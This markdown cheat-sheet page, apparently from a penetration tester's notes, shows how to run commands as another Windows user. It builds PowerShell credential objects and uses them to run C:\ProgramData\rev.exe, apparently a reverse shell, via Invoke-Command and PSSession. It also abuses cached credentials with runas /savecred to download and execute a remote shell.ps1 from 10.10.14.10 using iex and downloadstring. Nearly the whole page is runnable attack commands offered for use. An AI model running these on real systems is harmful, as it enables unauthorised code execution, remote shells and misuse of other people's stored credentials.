---
title: "Runas"
date: 2024-7-10
tags: ["powershell", "cred object", "Windows", "runas"]
---

---
### Create credential object

{{< tab set1 tab1 active >}}Method #1{{< /tab >}}
{{< tab set1 tab2 >}}Method #2{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```powershell
$username = '<DOMAIN>\<USER>'
```

```powershell
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```powershell
$username = '<DOMAIN>\<USER>'
```

```powershell
$password = '<PASSWORD>'
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

</div>

{{< /tabcontent >}}

### Runas (with cred object)

{{< tab set2 tab1 active >}}Invoke-Command{{< /tab >}}
{{< tab set2 tab2 >}}PSSession{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```powershell
Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost
```

```powershell
# If error, try
Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp
```

```powershell
# Invoke command with config
Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -ConfigurationName config_name
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

<div>

```powershell
new-pssession -computername . -credential $cred
```

```powershell
# Switch to new session
enter-pssession 1
```

</div>

{{< /tabcontent >}}

### Runas (with cache creds)

#### Check cache creds

<div>

```powershell
cmdkey /list
```

</div>

#### Run Command

<div>

```powershell
# e.g. Upload and run a shell
runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')"
```

</div>

<br>
